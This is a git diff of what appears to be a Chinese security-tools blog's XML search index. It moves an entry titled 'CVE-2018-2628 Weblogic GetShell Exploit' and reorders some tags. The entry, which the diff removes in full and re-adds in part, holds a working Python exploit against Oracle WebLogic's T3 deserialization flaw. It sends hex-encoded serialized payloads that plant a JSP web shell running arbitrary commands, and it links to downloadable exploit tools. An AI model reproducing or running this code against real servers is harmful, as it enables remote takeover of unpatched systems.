+dport = int(sys.argv[2])
+exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
+</div>
+<h2>&nbsp;演示:</h2>
+<p><img alt data-original="https://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
+<h2>附件说明:</h2>
+<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>GetShell</tag>
+        <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>全版本IIS提权工具iislpe</title>
     <url>/p/6b9b3afe.html</url>
     <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
@@ -9522,63 +9571,14 @@ from pprint import pprint
         <category>源码</category>
         <category>内网渗透</category>
         <category>信息收集</category>
-        <category>Python</category>
-        <category>嗅探</category>
         <category>编程</category>
+        <category>嗅探</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Code</tag>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
-    <url>/p/b8e58f69.html</url>
-    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<hr>
-<ul>
-<li>漏洞威胁：RCE--远程代码执行</li>
-<li>漏洞组件：weblogic</li>
-<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
-</ul>
-<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
-# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
-
-<p>from <strong>future</strong> import print_function</p>
-<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
-<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
-<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
-return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
-<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
-<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
-<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
-<pre><code>rs=send_payload_objdata(sock, payload)
-#print(&apos;response: &apos; + rs)
-print(&apos;exploit completed!&apos;)
-print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
-print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
-<pre><code>dip = sys.argv[1]
-dport = int(sys.argv[2])
-exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
-</div>
-<h2>&nbsp;演示:</h2>
-<p><img alt data-original="https://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
-<h2>附件说明:</h2>
-<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
-        <tag>GetShell</tag>
-        <tag>Weblogic</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
